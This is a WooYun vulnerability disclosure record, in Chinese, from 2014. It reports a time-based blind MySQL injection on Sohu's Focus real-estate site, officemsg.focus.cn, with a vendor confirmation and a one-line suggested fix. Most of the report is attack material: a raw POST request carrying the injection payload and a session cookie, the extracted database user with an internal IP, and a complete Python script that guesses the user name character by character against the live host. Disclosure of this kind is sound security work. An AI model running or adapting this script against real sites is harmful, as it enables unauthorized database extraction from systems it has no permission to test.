{"id": 48766, "wybug_id": "wooyun-2014-081733", "wybug_title": "焦点房产分站MySQL盲注[2] (附猜解python脚本)", "wybug_corp": "搜狐", "wybug_author": "lijiejie", "wybug_date": "2014-11-02 16:40", "wybug_open_date": "2014-12-17 16:42", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-17：\t细节向公众公开  简要描述： 焦点房产另一分站MySQL盲注 (附猜解python脚本)忘提到，上一个漏洞中提到的MySQL注入，在焦点好几个站点中均存在，需要复查的。 详细说明：  注入点位于：\nPOST /group/editphoto2.php HTTP/1.1Content-Length: 238Content-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestReferer: http://officemsg.focus.cnCookie: PHPSESSID=h5nt1tb8ifiil0s2pk8fadf830; city_check_inc=131072; city_check_domain=office.focus.cnHost: officemsg.focus.cnConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36Accept: */*album_id=0&description=1&group_id=0&photoname=DSC00887&photos_class%5b%5d=111'XOR(if(ascii(mid(lower(user()),1,1))!=123%2csleep(10)%2c0))OR'bbb&photo_ext=JPG&photo_id=610778\n参数photos_class[]可注入，MySQL time blind。   漏洞证明：  猜解user，得到：fdbuser@192.168.44.179\n\nPython脚本附上：\n#encoding=utf-8import httplibimport timeimport stringimport sysimport randomimport hashlibimport urllibheaders = {    'Content-Type': 'application/x-www-form-urlencoded',    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36',    'Referer': 'http://officemsg.focus.cn',}payloads = list(string.ascii_lowercase)for i in range(0,10):    payloads.append(str(i))payloads += ['@','_', '.']print '[%s] Start to retrive MySQL User' % time.strftime('%H:%M:%S', time.localtime())user = ''for i in range(1, 25):    found=False    while found==False:        for payload in payloads:            timeout_count = 0            for j in range(1,3):   # 2 times to confirm                try:                    params = {                        'album_id': 0,                        'description': 1,                        'group_id': 0,                        'photoname': 'DSC00887',                        'photo_ext': 'JPG',                        'photo_id': 610778,                        'photos_class[]': \"111'XOR(if(ascii(mid(lower(user()),%s,1))=%s,sleep(3),0))OR'bbb\" % (i, ord(payload))                    }                    body = urllib.urlencode(params)                    conn = httplib.HTTPConnection('officemsg.focus.cn', timeout=3)                    conn.request(method='POST',                                 url='/group/editphoto2.php',                                 body=body,                                 headers=headers)                    conn.getresponse().read()                    conn.close()                    print '.',                    break                except Exception, e:                    timeout_count += 1            if timeout_count == 2:                user += payload                print '\\n[In progress] now user is %s' % user                found = True                break        print '\\nFinally, MySQL user is', user\n   修复方案：  参数过滤   版权声明：转载请注明来源 lijiejie@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2014-11-03 00:20 厂商回复： 感谢支持。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}